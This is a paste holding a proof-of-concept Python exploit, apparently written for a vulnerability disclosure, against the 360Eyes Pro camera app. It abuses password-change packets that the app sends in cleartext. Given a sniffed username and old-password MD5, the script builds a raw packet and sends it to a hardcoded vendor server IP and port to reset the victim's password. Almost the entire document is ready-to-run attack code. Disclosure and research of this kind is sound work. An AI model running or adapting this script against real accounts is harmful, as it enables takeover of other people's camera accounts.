

[sourcehut](https://sr.ht)

[Log in](https://meta.sr.ht/oauth/authorize?client_id=1c1ad452ce596d6c&scopes=profile&state=%2F~edaigle%2Fc9637d682b65e6501efb1324bba7787a2f775ff4%3F)
â€”
[Register](https://meta.sr.ht)

## [~edaigle](/~edaigle)/360eyes\_publication unlisted

* [view paste](/~edaigle/c9637d682b65e6501efb1324bba7787a2f775ff4)

[#](#360eyes_publication)

360eyes\_publication
-rw-r--r--

2.2 KiB

[View raw](/blob/6e57ce5ea173388a96134b589a12e50a876308a1)

```

```
```
[1](#360eyes_publication-L1)
[2](#360eyes_publication-L2)
[3](#360eyes_publication-L3)
[4](#360eyes_publication-L4)
[5](#360eyes_publication-L5)
[6](#360eyes_publication-L6)
[7](#360eyes_publication-L7)
[8](#360eyes_publication-L8)
[9](#360eyes_publication-L9)
[10](#360eyes_publication-L10)
[11](#360eyes_publication-L11)
[12](#360eyes_publication-L12)
[13](#360eyes_publication-L13)
[14](#360eyes_publication-L14)
[15](#360eyes_publication-L15)
[16](#360eyes_publication-L16)
[17](#360eyes_publication-L17)
[18](#360eyes_publication-L18)
[19](#360eyes_publication-L19)
[20](#360eyes_publication-L20)
[21](#360eyes_publication-L21)
[22](#360eyes_publication-L22)
[23](#360eyes_publication-L23)
[24](#360eyes_publication-L24)
[25](#360eyes_publication-L25)
[26](#360eyes_publication-L26)
[27](#360eyes_publication-L27)
[28](#360eyes_publication-L28)
[29](#360eyes_publication-L29)
[30](#360eyes_publication-L30)
[31](#360eyes_publication-L31)
[32](#360eyes_publication-L32)
[33](#360eyes_publication-L33)
[34](#360eyes_publication-L34)
[35](#360eyes_publication-L35)
[36](#360eyes_publication-L36)
[37](#360eyes_publication-L37)
[38](#360eyes_publication-L38)
[39](#360eyes_publication-L39)
[40](#360eyes_publication-L40)
[41](#360eyes_publication-L41)
[42](#360eyes_publication-L42)
[43](#360eyes_publication-L43)
[44](#360eyes_publication-L44)
[45](#360eyes_publication-L45)
[46](#360eyes_publication-L46)
[47](#360eyes_publication-L47)
[48](#360eyes_publication-L48)
[49](#360eyes_publication-L49)
[50](#360eyes_publication-L50)
[51](#360eyes_publication-L51)
[52](#360eyes_publication-L52)
[53](#360eyes_publication-L53)
```
```
# Puwell Cloud Tech Co, Ltd 360Eyes Pro v3.9.5.16(3090516)
#
# Cleartext transmission of sensitive information vulnerability:
# password change packets sent in cleartext, can easily be replayed
#
# Puwell Cloud Tech Co, Ltd 360Eyes Pro v3.9.5.16(3090516) was discovered
# to transmit sensitive information in cleartext. This vulnerability
# allows attackers to intercept and access sensitive information,
# including users' credentials and password change requests.
#
# Copyright 2024 Eric Daigle
#
# Instructions to replicate:
# 1. Download 360Eyes Pro application from Play Store
#
# 2. Create an account and sign out
#
# 3. Run this script with required arguments. Note that MD5 of old password can
#    be trivially obtained by anyone on the network through Wireshark, as the
#    password change packet is sent unencrypted.
#
# 4. Try to sign back in to the account, observe password has been changed
#
# For demo convenience, some hashes are provided:
# MD5(iotpwn1) = f169ce871fb7f41dd78bf69ac1363190
# MD5(iotpwn2) = 3fcae8ed3011cb1852c19acb6e265cb9
import argparse
import hashlib
import socket

HOST, PORT = "52.8.101.180", 19000

parser = argparse.ArgumentParser("change_pass")
parser.add_argument("username", help="The sniffed username, in plain text", type=str)
parser.add_argument("old_pass_md5", help="The sniffed MD5 of the old password, in plain text", type=str)
parser.add_argument("new_pass", help="The new password you'd like to set", type=str)
args = parser.parse_args()

new_pass_md5 = hashlib.md5(args.new_pass.encode("utf-8")).hexdigest()

data = bytes.fromhex(f"ccddeeff1d270000e4126900d400000000000000235f3336306579657323{str.encode(args.username).hex()}0000000000000000000000000000000000000000000000000000000000000000{str.encode(args.old_pass_md5).hex()}0000000000000000000000000000000000000000000000000000000000000000{str.encode(new_pass_md5).hex()}0000000000000000000000000000000000000000000000000000000000000000")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))
    sock.sendall(data)
    received = sock.recv(1024)

print(f"Sent:\n{data.hex()}")

if received.hex() == "ccddeeff1d270000e51269001400000000000000":
    print("Success")
else:
    print("Error response, double-check your inputs")

```

